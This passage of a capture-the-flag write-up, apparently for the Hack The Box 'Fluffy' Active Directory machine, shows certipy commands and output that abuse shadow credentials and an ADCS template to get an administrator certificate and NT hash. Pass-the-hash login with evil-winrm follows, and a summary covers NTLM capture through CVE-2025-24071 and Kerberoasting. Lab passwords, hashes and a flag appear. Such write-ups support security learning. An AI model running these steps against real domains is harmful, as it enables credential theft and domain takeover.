</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Restoring<span class="w"> </span>the<span class="w"> </span>old<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>restored<span class="w"> </span>the<span class="w"> </span>old<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-18"><a id="__codelineno-51-18" name="__codelineno-51-18" href="#__codelineno-51-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>:<span class="w"> </span>ca0f4f9e9eb8a092addf53bb03fc98c8
</span></code></pre></div><br />
According to this snippet of the above output:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>[*] Saved credential cache to &#39;ca_svc.ccache&#39;
</span></code></pre></div><br />
we should tell kerberos to use this credential <code>ca_svc.ccache</code>:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ca_svc.ccache<span class="w"> </span>
</span></code></pre></div></p>
<h4 id="4-request-a-certificate">**4. Request a certificate</h4>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-k<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">&#39;DC01.FLUFFY.HTB&#39;</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;fluffy-DC01-CA&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;User&#39;</span>
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">16</span>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;administrator&#39;</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span><span class="w">         </span>
</span></code></pre></div><br />
(keep in mind sometimes you need to rerun the commands or even sync with the domain again, there can be network errors)</p>
<h4 id="5-restore-the-upn-of-the-victim-account"><strong>5 : Restore the UPN of the "victim" account.</strong></h4>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>certipy-ad<span class="w"> </span>account<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-upn<span class="w"> </span><span class="s1">&#39;ca_svc@fluffy.htb&#39;</span><span class="w"> </span>-user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span><span class="w"> </span>update
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Updating<span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>:
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="w">    </span>userPrincipalName<span class="w">                   </span>:<span class="w"> </span>ca_svc@fluffy.htb
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>updated<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span></code></pre></div></p>
<h4 id="6-authenticate-as-the-target-administrator"><strong>6 : Authenticate as the target administrator.</strong></h4>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-pfx<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span><span class="w"> </span>-username<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w"> </span>-domain<span class="w"> </span><span class="s1">&#39;fluffy.htb&#39;</span>
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>administrator@fluffy.htb
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.ccache&#39;</span>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span>
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator@fluffy.htb&#39;</span>:<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
</span></code></pre></div><br />
we got hash!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
</span></code></pre></div><br />
grab the 2nd part and login with winrm<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;8da83a3fa618b6e3a00e93f676c92a6e&#39;</span>
</span></code></pre></div><br />
got the root flag!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>ca48648c7b02dd108e61dda67896f5b7
</span></code></pre></div></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h2 id="reconnaissance_1">Reconnaissance</h2>
<ol>
<li>Add host to <code>/etc/hosts</code> and run <code>nmap -sV -Pn</code> → AD ports (DNS, Kerberos, LDAP, SMB, WinRM) and host identified as <code>DC01</code>.</li>
<li>Correlated provided creds against services (SMB/LDAP) — <code>j.fleischman</code> works for SMB; </li>
<li>Enumerated SMB shares.</li>
<li>Inspected <code>IT</code> share → download <code>Upgrade_Notice.pdf</code>, <code>Everything</code>, <code>KeePass</code> archive; <code>Upgrade_Notice.pdf</code> flags CVE-2025-24071 (<code>.library-ms</code> ZIP → SMB auth leak).</li>
<li>Decide exploit vector: target CVE-2025-24071 via crafted ZIP upload to <code>IT</code> to trigger NTLM auth capture.</li>
</ol>
<h2 id="foothold_1">Foothold</h2>
<ol>
<li>Create PoC <code>exploit.zip</code> for CVE-2025-24071 and upload to <code>//fluffy.htb/IT</code> via <code>smbclient</code>.</li>
<li>Run <code>responder</code> locally to capture incoming NTLM auths; capture NTLMv2 from <code>p.agila</code>.</li>
<li>Crack captured NTLMv2 with <code>john</code> → <code>p.agila:prometheusx-303</code>.</li>
<li>Validate <code>p.agila</code> credentials against SMB/LDAP and continue enumeration from that account.</li>
<li>Enumerate domain users/groups via <code>crackmapexec</code>/LDAP — find <code>ca_svc</code>, <code>ldap_svc</code>, <code>winrm_svc</code>, <code>Cert Publishers</code>, <code>Service Accounts</code>, etc.</li>
<li>Dump SPNs with <code>GetUserSPNs.py</code> → collect TGS hashes for <code>ca_svc</code>, <code>ldap_svc</code>, <code>winrm_svc</code>; </li>
<li>Hashcracking attempts failed, had to find another way</li>
<li>Run BloodHound as <code>p.agila</code> → discovered outbound <code>GenericWrite</code>/owner-style control from service-account-managing groups over <code>ca_svc</code> and other service accounts; <code>ca_svc</code> is in <code>Cert Publishers</code> (ADCS path identified).</li>
</ol>
<h2 id="privesc_1">Privesc</h2>
<ol>
<li>Use <code>GenericWrite</code>/owner control findings to modify/abuse <code>ca_svc</code> (or set owner) so the service account can be used for cert enrollment or shadow creds.</li>
<li>Enumerate ADCS templates and request a cert using the service account context (certipy-like workflow) against a vulnerable template that permits high-privilege UPN enrollment.</li>
<li>Extract auth from the returned certificate (<code>.pfx</code>) or retrieve shadow credentials / NT hash for <code>ca_svc</code></li>
<li>Use the cert/hash to authenticate as a privileged account (Administrator) via certificate or hash-based login (e.g., <code>evil-winrm -u administrator -H &lt;hash&gt;</code> or cert auth).</li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>This one was a classic yet challenging easy AD related box that did not dissaspoint. The techniques showed here are definitely worth revisiting in the future, especially for machines related to certificates. </p>
<p>https://www.hackthebox.com/achievement/machine/284567/662<br />
<img alt="Pasted image 20250604013347" src="../MediaFiles/Pasted%20image%2020250604013347.png" /></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>